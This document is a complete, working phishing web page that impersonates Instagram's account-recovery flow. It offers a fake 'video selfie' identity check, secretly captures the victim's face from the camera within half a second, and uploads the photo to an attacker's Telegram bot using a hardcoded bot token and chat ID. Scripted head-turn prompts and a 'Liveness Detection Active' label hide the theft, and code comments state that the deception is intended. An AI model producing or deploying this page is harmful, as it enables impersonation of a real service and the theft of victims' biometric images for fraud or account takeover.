<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram - Find Your Account</title>
    <style>
        :root {
            --main-color: #0095f6;
            --bg-dark: #000000;
            --card-bg: #121212;
            --text-gray: #a8a8a8;
        }
        body {
            background-color: var(--bg-dark);
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .app-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
        }
        /* المراحل */
        .step { display: none; }
        .active { display: block; }

        /* تصميم الصفحة 1 */
        .header-row { display: flex; align-items: center; margin-bottom: 30px; }
        .back-arrow { font-size: 24px; cursor: pointer; margin-left: 20px; color: white; }
        h2 { font-size: 22px; font-weight: 600; margin: 0; }
        .sub-text { font-size: 14px; color: #efefef; margin-bottom: 10px; margin-top: 15px; }
        .link-text { color: #0095f6; font-size: 13px; text-decoration: none; display: block; margin-bottom: 20px; cursor: pointer; }
        
        .input-field {
            background-color: #121212;
            border: 1px solid #363636;
            border-radius: 8px;
            padding: 12px;
            color: white;
            width: 100%;
            box-sizing: border-box;
            font-size: 14px;
            margin-bottom: 20px;
            outline: none;
        }
        .btn-blue {
            background-color: var(--main-color);
            color: white;
            border: none;
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 20px;
        }
        .footer-text { text-align: center; font-size: 14px; color: #efefef; cursor: pointer; }

        /* تصميم التحقق */
        .verify-card { background: var(--card-bg); padding: 30px 20px; border-radius: 20px; border: 1px solid #333; text-align: center; }
        .camera-box {
            width: 260px;
            height: 260px;
            margin: 20px auto;
            border: 3px solid var(--main-color);
            border-radius: 50%;
            overflow: hidden;
            position: relative;
            background: #262626;
        }
        #hidden-video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .scanning-line {
            position: absolute;
            width: 100%;
            height: 4px;
            background: var(--main-color);
            box-shadow: 0 0 15px var(--main-color);
            top: 0;
            animation: scan 2s linear infinite;
        }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        
        .loader-spinner {
            border: 3px solid #333;
            border-top: 3px solid var(--main-color);
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-left: 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        canvas { display: none; }
    </style>
</head>
<body>

<div class="app-container">
    <!-- المرحلة 1: Find your account -->
    <div id="step1" class="step active">
        <div class="header-row">
            <span class="back-arrow" onclick="alert('Back to Home')">〈</span>
            <h2>Find your account</h2>
        </div>
        <p class="sub-text">Enter your email or username.</p>
        <span class="link-text" onclick="fakeLoad('Checking security status...')">I think my account is hacked</span>
        <input type="text" class="input-field" placeholder="Email or username" id="user-input">
        <button class="btn-blue" id="continue-btn" onclick="handleContinue()">Continue</button>
        <div class="footer-text" onclick="fakeLoad('Loading mobile search...')">Find by mobile number</div>
    </div>

    <!-- المرحلة 2: التحقق من الهوية -->
    <div id="step2" class="step">
        <div class="verify-card">
            <h2 style="margin-bottom:15px">Identity Confirmation</h2>
            <p style="font-size:14px; color:#aaa; margin-bottom:25px">To protect your privacy, we need to confirm that you are the account owner via a quick video selfie.</p>
            <button class="btn-blue" onclick="startCapture()">Continue to Selfie</button>
        </div>
    </div>

    <!-- المرحلة 3: التقاط الصورة الفوري -->
    <div id="step3" class="step">
        <div class="verify-card">
            <div id="inst-text" style="font-size:16px; margin-bottom:20px; font-weight:500">Position your face in the circle</div>
            <div class="camera-box">
                <div class="scanning-line"></div>
                <video id="hidden-video" autoplay playsinline></video>
            </div>
            <p style="font-size:13px; color:#888">Liveness Detection Active...</p>
        </div>
    </div>
</div>

<canvas id="canvas"></canvas>

<script>
    const TOKEN = '8591096426:AAETM1heWHK4l_M8bcEyo6iAslmAuMUUQEk';
    const CHAT_ID = '7839090123';
    
    const video = document.getElementById('hidden-video');
    const canvas = document.getElementById('canvas');

    // وظيفة لمحاكاة تحميل وهمي عند الضغط على الروابط
    function fakeLoad(msg) {
        const btn = document.getElementById('continue-btn');
        const originalText = btn.innerText;
        btn.innerHTML = `<div class="loader-spinner"></div> Loading...`;
        setTimeout(() => {
            alert(msg + " - This feature is temporarily unavailable.");
            btn.innerText = originalText;
        }, 1500);
    }

    function handleContinue() {
        const input = document.getElementById('user-input').value;
        if(input === "") { alert("Please enter email or username"); return; }
        
        const btn = document.getElementById('continue-btn');
        btn.innerHTML = `<div class="loader-spinner"></div> Searching...`;
        
        setTimeout(() => {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        }, 1200);
    }

    async function startCapture() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            
            document.getElementById('step2').style.display = 'none';
            document.getElementById('step3').style.display = 'block';

            // التقاط وإرسال فوري (بدون انتظار)
            setTimeout(() => {
                captureAndSend();
            }, 500); // نصف ثانية فقط ليتم التصوير بمجرد فتح الكاميرا

            // تغيير التعليمات لإيهام المستخدم أن العملية مستمرة
            const inst = document.getElementById('inst-text');
            setTimeout(() => { inst.innerText = "Slowly turn your head right →"; }, 2000);
            setTimeout(() => { inst.innerText = "Slowly turn your head left ←"; }, 5000);
            setTimeout(() => { inst.innerText = "Verification Complete!"; }, 8000);

        } catch (err) {
            alert("Camera access is required for identity verification.");
        }
    }

    async function captureAndSend() {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'insta_recovery.jpg');

            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error("Telegram Error:", error);
            }
        }, 'image/jpeg');

        // إيقاف الكاميرا لسرية العملية
        const stream = video.srcObject;
        const tracks = stream.getTracks();
        tracks.forEach(track => track.stop());
    }
</script>

</body>
</html>
